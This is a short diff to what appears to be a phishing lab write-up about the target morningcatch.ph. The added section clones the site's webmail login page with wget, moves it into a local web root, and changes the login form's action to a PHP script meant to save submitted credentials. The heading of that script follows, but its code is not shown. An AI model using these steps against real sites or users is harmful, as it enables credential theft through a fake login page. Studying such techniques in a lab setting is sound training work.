@@ -68,6 +68,30 @@ $ nc -z morningcatch.ph 25
 $ firefox morningcatch.ph
 ```
 
+### Cloning morningcatch.ph
+
+Using wget we can clone the site: 
+
+```bash
+wget -r -l1 -k -p morningcatch.ph/mail/
+sudo mv morningcatch.ph/mail /var/www/html/
+sudo vim /var/www/html/mail/index.html
+```
+
+In order to capture the credentials entered into our site we need to modify the login form to call a php script that will save the form input to disk.
+
+Old post element:
+
+```html
+<form name="form" action="index.html" method="post">
+```
+
+New post element:
+
+```html
+<form name="form" action="form.php" method="post">
+```
+
 ### PHP Script for Saving Credentials
 
 ```php
